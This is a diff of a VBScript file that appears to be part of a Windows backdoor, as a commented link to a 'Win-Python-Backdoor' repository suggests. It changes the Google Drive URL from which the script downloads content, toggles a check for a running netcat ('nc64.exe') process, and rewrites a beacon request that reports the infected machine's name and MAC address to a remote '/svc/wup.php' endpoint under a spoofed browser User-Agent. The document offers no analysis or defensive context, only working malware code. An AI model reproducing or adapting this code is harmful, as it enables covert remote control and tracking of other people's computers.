@@ -2,7 +2,8 @@ On Error Resume Next
 set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
 dim url,mac
   'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
-  url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
+  'url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
+  url="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny"
 'msgbox  url&"site.txt"
 'xmlhttp.open "get", url&"site.txt", false
 
@@ -32,7 +33,7 @@ next
 Set colItems = objWMIService.ExecQuery("Select * From Win32_Process where name='nc64.exe'")
 'msgbox colitems
 dim brun
-brun=true
+'brun=true
 For Each objItem in colItems
     'msgbox objItem.name & " " & objItem.ProcessID & " " & objItem.CommandLine
     'If objItem.name = "Calculator.exe" then objItem.terminate
@@ -44,7 +45,8 @@ dim arr
       
       'Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
       
-      xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
+      'xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
+      xmlhttp.open "get", x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
       xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
       xmlhttp.send
       strOutput = xmlhttp.responseText
